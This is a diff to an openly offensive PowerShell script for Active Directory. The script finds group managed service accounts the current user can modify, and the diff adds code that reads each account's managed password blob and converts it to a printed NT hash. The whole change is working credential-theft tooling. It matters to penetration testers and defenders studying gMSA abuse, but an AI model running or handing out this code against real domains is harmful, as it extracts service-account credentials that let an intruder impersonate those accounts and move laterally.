@@ -66,7 +66,7 @@ if ($results.Count -gt 0) {
     exit
 }
 
-Write-Host "`n[+] Checking for permissions on gMSA accounts..."
+Write-Host "`n[+] Checking for permissions on gMSA(s)..."
 
 $schemaIDGUID = @{}
 Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter '(name=ms-ds-GroupMSAMembership)' -Properties name, schemaIDGUID |
@@ -121,7 +121,7 @@ foreach ($gmsa in $results) {
         $vulnerableGMSAs += $gmsa
         Write-Host "`n[!] VULNERABLE: Current user can modify attributes on gMSA: $($gmsa.Name)" -ForegroundColor Green
         foreach ($detail in $permissionDetails) {
-            Write-Host "  $detail" -ForegroundColor Yellow
+            Write-Host "  $detail"
         }
     }
 }
@@ -129,7 +129,30 @@ foreach ($gmsa in $results) {
 Set-Location $env:USERPROFILE
 
 if ($vulnerableGMSAs.Count -gt 0) {
-    Write-Host "`n[!] Found $($vulnerableGMSAs.Count) gMSA(s) that the current user can potentially abuse!" -ForegroundColor Green
+    Write-Host "`n[+] Found $($vulnerableGMSAs.Count) gMSA(s) that the current user can potentially abuse!" -ForegroundColor Green
+    
+    Write-Host "`n[+] Attempting to retrieve NT hashes for vulnerable gMSA(s)..." -ForegroundColor Green
+    
+    foreach ($gmsa in $vulnerableGMSAs) {
+        Write-Host "`n[+] Processing gMSA: $($gmsa.Name)"
+        
+        try {
+            Write-Host "  [+] Retrieving managed password..."
+            $pwd = Get-ADServiceAccount -Identity $gmsa.Name -Properties msds-ManagedPassword
+            
+            if ($pwd.'msds-ManagedPassword') {
+                Write-Host "  [+] Converting managed password to NT hash..."
+                $pw = ConvertFrom-ADManagedPasswordBlob $pwd.'msds-ManagedPassword'
+                $ntHash = ConvertTo-NTHash $pw.SecureCurrentPassword
+                Write-Host "  [+] NT Hash for $($gmsa.Name): $ntHash" -ForegroundColor Green
+            } else {
+                Write-Host "  [!] Failed to retrieve managed password" -ForegroundColor Red
+            }
+        } catch {
+            Write-Host "  [!] Error retrieving NT hash: $_" -ForegroundColor Red
+        }
+    }
 } else {
-    Write-Host "`n[+] No gMSA(s) found that the current user can modify." -ForegroundColor Red
+    Write-Host "`n[!] No gMSA(s) found that the current user can modify." -ForegroundColor Red
+    exit
 }
